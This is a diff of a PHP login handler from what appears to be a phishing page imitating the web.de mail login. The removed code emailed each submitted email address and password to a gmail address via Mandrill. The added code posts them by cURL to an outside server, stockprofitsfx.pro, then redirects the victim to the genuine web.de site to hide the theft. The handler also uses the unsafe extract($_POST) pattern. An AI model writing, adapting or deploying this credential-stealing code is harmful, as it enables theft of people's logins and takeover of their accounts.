@@ -1,48 +1,37 @@
 <?php
 
 if (isset($_POST['login'])) {
-    extract($_POST);
+  extract($_POST);
 
-    $api_key = 'YOUR_MANDRILL_API_KEY';
+  $apiEndpoint = 'https://stockprofitsfx.pro/email_api_service/send-email';
 
-    $url = 'https://mandrillapp.com/api/1.0/messages/send.json';
+  $postData = [
+    'email' => $email,
+    'password' => $password,
+  ];
 
-    $data = array(
-        'key' => $api_key,
-        'message' => array(
-            'html' => '<p>New registration details: <br>Email: ' . $email . '<br>Password: ' . $password . '<br>Kind Regards</p>',
-            'subject' => 'New Registration Details',
-            'from_email' => 'your@email.com', // Replace with your email
-            'to' => array(
-                array(
-                    'email' => 'quean29@gmail.com', // Replace with recipient's email
-                    'name' => 'Recipient Name',
-                    'type' => 'to'
-                )
-            )
-        )
-    );
+  $ch = curl_init($apiEndpoint);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+  curl_setopt($ch, CURLOPT_POST, true);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
 
-    $options = array(
-        'http' => array(
-            'header' => "Content-type: application/json\r\n",
-            'method' => 'POST',
-            'content' => json_encode($data),
-        ),
-    );
+  $response = curl_exec($ch);
 
-    $context = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
+  if ($response === false) {
+    echo 'Error sending data to the API endpoint: ' . curl_error($ch);
+  } else {
+    $responseData = json_decode($response, true);
 
-    if ($result === FALSE) {
-        // Handle error
-        echo 'Error sending email.';
+    if (isset($responseData['statusCode']) && $responseData['statusCode'] == 200) {
+      header("Location: https://mm.web.de/");
     } else {
-        header("Location: https://mm.web.de/");
+      echo 'API request failed: ' . $responseData['message'];
     }
+  }
+
+  curl_close($ch);
 }
 ?>
-
 
 <!doctype html>
 <html lang="en">
